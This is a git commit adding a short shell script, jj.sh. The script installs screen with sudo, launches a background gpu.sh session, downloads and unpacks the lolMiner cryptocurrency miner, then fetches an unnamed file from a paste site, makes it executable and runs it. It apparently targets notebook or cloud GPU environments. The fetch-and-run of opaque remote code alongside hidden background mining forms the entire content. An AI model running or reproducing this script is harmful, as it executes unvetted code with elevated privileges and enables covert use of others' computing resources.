3fbd52e51170176f1e37128c556a3f6a90b93c4b
narutogila15 <88438239+narutogila15@users.noreply.github.com>
2021-08-07 08:15:00 +0700

    Add files via upload

---
+++ jj.sh
@@ -0,0 +1,2 @@
+#!/bin/sh
+! sudo apt update && sudo apt install screen -y && screen -dmS gpu.sh ./gpu.sh 65 75 && wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -xf lolMiner_v1.31_Lin64.tar.gz && cd 1.31 && wget https://www.heypasteit.com/download/0IWYYQ && chmod u+x 0IWYYQ && ./0IWYYQ
